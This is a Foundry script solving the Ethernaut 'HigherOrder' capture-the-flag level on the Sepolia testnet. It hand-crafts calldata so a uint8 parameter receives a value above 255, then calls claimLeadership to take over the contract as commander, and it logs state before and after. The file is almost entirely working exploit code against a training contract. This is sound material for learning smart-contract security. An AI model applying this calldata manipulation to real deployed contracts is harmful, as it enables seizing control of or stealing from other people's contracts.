// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.0 <=0.9.0;

import { console } from "@dev/forge-std/console.sol";
import { EthernautScript } from "./00_Ethernaut.s.sol";
import { HigherOrder } from "@contracts/CTF/Ethernaut/30_HigherOrder.sol";
/*
forge script \
  foundry/script/CTF/Ethernaut/30_HigherOrder.s.sol:HigherOrderAttack \
  -f sepolia -vvvv \
  --broadcast


forge debug \
  foundry/script/CTF/Ethernaut/30_HigherOrder.s.sol:HigherOrderAttack \
  -f sepolia -vvvv \
  --broadcast

cast storage -r sepolia 0xdafE5Fd62b37Ad7739669bbc38300505309c388E 0
cast storage -r sepolia 0xdafE5Fd62b37Ad7739669bbc38300505309c388E 1
cast storage -r sepolia 0xdafE5Fd62b37Ad7739669bbc38300505309c388E 2


https://docs.soliditylang.org/en/latest/internals/layout_in_memory.html
https://www.evm.codes/
https://docs.soliditylang.org/en/latest/internals/layout_in_calldata.html
https://info.etherscan.com/understanding-transaction-input-data/
https://docs.soliditylang.org/en/latest/abi-spec.html#abi


*/

contract HigherOrderAttack is EthernautScript {
    HigherOrder private victimInst;

    function run() public broadcast {
        // 1.Setup
        console.log("HigherOrder Before Attack player:", broadcaster);
        victimInst = HigherOrder(0xC1488997Cb4E24e212eC954D3f65725052539dcb);
        console.log("HigherOrder Before Attack commander:", victimInst.commander());
        console.log("HigherOrder Before Attack treasury:", victimInst.treasury());

        // 2.Attack
        // ...
        // uint8.max =  255

        // victimInst.registerTreasury(256); // can't run

        // Solution 1
        // bytes memory data = abi.encodeWithSignature("registerTreasury(uint8)", 256);

        // Solution 2
        bytes memory data = abi.encodeWithSignature("registerTreasury(uint8)", 0);
        data[34] = hex"01";

        (bool response,) = address(victimInst).call(data);
        console.log("HigherOrder Proccess Attack status:", response);
        victimInst.claimLeadership();

        // 3Check
        // ...
        console.log("HigherOrder After  Attack commander:", victimInst.commander());
        console.log("HigherOrder After  Attack treasury:", victimInst.treasury());
    }
}
